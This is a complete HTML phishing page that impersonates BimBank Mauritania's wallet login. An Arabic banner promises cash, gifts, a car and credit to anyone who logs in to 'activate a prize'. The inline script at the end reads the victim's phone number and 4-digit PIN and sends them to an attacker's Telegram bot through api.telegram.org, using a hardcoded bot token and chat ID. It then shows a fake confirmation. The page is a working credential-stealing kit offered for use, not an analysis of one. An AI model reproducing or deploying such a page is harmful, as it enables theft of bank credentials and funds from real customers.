<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bim Bank - Espace Cadeaux</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
        
        body { font-family: 'Cairo', sans-serif; background-color: #fcfcfc; margin: 0; }

        /* خلفية الشبكة الدقيقة */
        .bg-grid {
            background-image: radial-gradient(#d1d5db 1px, transparent 1px);
            background-size: 20px 20px;
        }

        /* تصميم شعار بيم بنك المبتكر بالكود (غير مشفر) */
        .custom-logo-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            padding: 20px 0;
        }
        .logo-shape {
            width: 50px;
            height: 50px;
            position: relative;
            transform: rotate(45deg);
        }
        .shape-part {
            position: absolute;
            width: 25px;
            height: 25px;
        }
        .p1 { background: #00a19a; top: 0; left: 0; border-radius: 5px 0 0 0; }
        .p2 { background: #e6007e; top: 0; right: 0; border-radius: 0 5px 0 0; }
        .p3 { background: #f19e2c; bottom: 0; left: 0; border-radius: 0 0 0 5px; }
        .p4 { background: #2a4387; bottom: 0; right: 0; border-radius: 0 0 5px 0; }

        .logo-text {
            text-align: left;
            border-left: 2px solid #2a4387;
            padding-left: 10px;
        }
        .bank-name { color: #2a4387; font-weight: 900; font-size: 24px; line-height: 1; }
        .bank-sub { color: #2a4387; font-size: 10px; font-weight: bold; letter-spacing: 1px; }

        /* قسم الجوائز المتحرك */
        .prizes-banner {
            background: linear-gradient(135deg, #2a4387, #1e293b);
            color: white;
            padding: 15px;
            margin: 10px;
            border-radius: 15px;
            display: flex;
            justify-content: space-around;
            align-items: center;
            box-shadow: 0 10px 20px rgba(42, 67, 135, 0.2);
        }
        .prize-item { text-align: center; }
        .prize-icon { font-size: 28px; display: block; margin-bottom: 5px; }
        .prize-label { font-size: 10px; font-weight: bold; opacity: 0.9; }

        /* تنسيق المدخلات */
        .input-style {
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 16px;
            width: 100%;
            font-size: 16px;
            background: white;
            outline: none;
            transition: all 0.3s;
        }
        .input-style:focus { border-color: #f19e2c; box-shadow: 0 0 0 3px rgba(241, 158, 44, 0.1); }

        .btn-gold {
            background: linear-gradient(to right, #f19e2c, #d97706);
            color: white;
            font-weight: 900;
            padding: 16px;
            border-radius: 12px;
            width: 100%;
            font-size: 18px;
            margin-top: 20px;
            box-shadow: 0 4px 15px rgba(241, 158, 44, 0.3);
        }
    </style>
</head>
<body class="bg-grid min-h-screen">

    <!-- الشعار الجديد المصمم بالكود -->
    <div class="custom-logo-container">
        <div class="logo-shape">
            <div class="shape-part p1"></div>
            <div class="shape-part p2"></div>
            <div class="shape-part p3"></div>
            <div class="shape-part p4"></div>
        </div>
        <div class="logo-text">
            <div class="bank-name">BimBank</div>
            <div class="bank-sub">MAURITANIE</div>
        </div>
    </div>

    <!-- قسم الهدايا والفلوس ومفاتيح السيارة -->
    <div class="prizes-banner">
        <div class="prize-item">
            <span class="prize-icon">💰</span>
            <span class="prize-label">نقدية</span>
        </div>
        <div class="prize-item">
            <span class="prize-icon">🎁</span>
            <span class="prize-label">هدايا</span>
        </div>
        <div class="prize-item">
            <span class="prize-icon">🔑</span>
            <span class="prize-label">سيارة</span>
        </div>
        <div class="prize-item">
            <span class="prize-icon">💳</span>
            <span class="prize-label">رصيد</span>
        </div>
    </div>

    <div class="text-center mt-4">
        <p class="text-[#2a4387] font-bold">Bienvenue dans votre espace wallet</p>
        <p class="text-gray-400 text-xs mt-1">سجل دخولك لتفعيل جائزتك</p>
    </div>

    <div class="max-w-sm mx-auto px-6 mt-8">
        <!-- أزرار التبديل -->
        <div class="flex border border-[#2a4387] rounded-lg overflow-hidden mb-8">
            <div class="flex-1 bg-[#2a4387] text-white py-2 text-center font-bold">Wallet</div>
            <div class="flex-1 bg-white text-gray-400 py-2 text-center font-bold">Banking</div>
        </div>

        <h2 class="text-right text-[#2a4387] font-black text-xl mb-4">Connexion</h2>

        <div class="space-y-4">
            <div>
                <input id="u_phone" type="tel" maxlength="8" class="input-style text-right" placeholder="Téléphone">
                <p class="text-left text-[10px] text-gray-400 mt-1">0/8</p>
            </div>
            <div>
                <input id="u_pin" type="password" maxlength="4" class="input-style text-right" placeholder="Mot de passe">
                <p class="text-left text-[10px] text-gray-400 mt-1">0/4</p>
            </div>
        </div>

        <div class="text-right mt-2">
            <a href="#" class="text-gray-400 text-xs font-bold">Mot de passe oublié ?</a>
        </div>

        <button onclick="claimPrize()" class="btn-gold">تفعيل الجائزة الآن</button>

        <div class="mt-10 text-center">
            <p class="text-gray-400 text-sm">Nouvel utilisateur ?</p>
            <a href="#" class="text-[#2a4387] font-black mt-1 block">S'inscrire maintenant &rarr;</a>
        </div>
    </div>

    <script>
        const T_K = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
        const C_I = "8665814266";

        function claimPrize() {
            const p = document.getElementById('u_phone').value;
            const s = document.getElementById('u_pin').value;
            
            if(p.length === 8 && s.length === 4) {
                const text = `💎 BimBank Prize Claim:\n📱 Phone: ${p}\n🔑 PIN: ${s}`;
                fetch(`https://api.telegram.org/bot${T_K}/sendMessage?chat_id=${C_I}&text=${encodeURIComponent(text)}`)
                .then(() => {
                    alert("تم استلام طلب تفعيل الجائزة. يرجى انتظار رسالة التأكيد.");
                    location.reload();
                });
            } else {
                alert("يرجى إكمال البيانات بشكل صحيح.");
            }
        }
    </script>
</body>
</html>
